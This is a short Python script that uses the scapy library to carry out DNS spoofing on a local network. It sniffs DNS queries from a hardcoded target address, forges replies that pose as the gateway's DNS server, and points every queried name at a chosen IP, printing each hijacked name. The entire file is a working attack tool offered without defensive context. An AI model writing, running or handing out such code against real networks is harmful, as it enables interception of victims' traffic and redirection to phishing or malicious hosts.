import scapy.all as s


def handle_dns_request(packet):
    global target_ip,dns_server_ip,spoofed_ip

    # Check if the packet is a DNS request from the target machine
    if packet.haslayer(s.DNSQR) and packet[s.IP].src == target_ip and packet[s.UDP].dport == 53:
        # Create a DNS response packet and modify it to redirect traffic to a different IP address
        response_packet = s.IP(dst=packet[s.IP].src, src=dns_server_ip) / s.UDP(dport=packet[s.UDP].sport, sport=53) / s.DNS(id=packet[s.DNS].id, qr=1, qdcount=1, ancount=1, qd=packet[s.DNSQR], an=s.DNSRR(rrname=packet[s.DNSQR].qname, ttl=10, rdata=spoofed_ip))

        an=s.DNSRR(rrname=packet[s.DNSQR].qname, ttl=10, rdata=spoofed_ip)

        # Send the spoofed DNS response packet to the target machine
        s.send(response_packet, verbose=0)
        print("DNS request intercepted and spoofed:", packet[s.DNSQR].qname.decode())


# Define the IP addresses for the target and the DNS server, and the IP address to redirect traffic to

target_ip = "192.168.77.105"
dns_server_ip = "192.168.77.1"
spoofed_ip = "192.168.77.108"

# Start sniffing DNS packets and handle each request using the handle_dns_request function
s.sniff(filter="udp and port 53 and src " + target_ip, prn=handle_dns_request)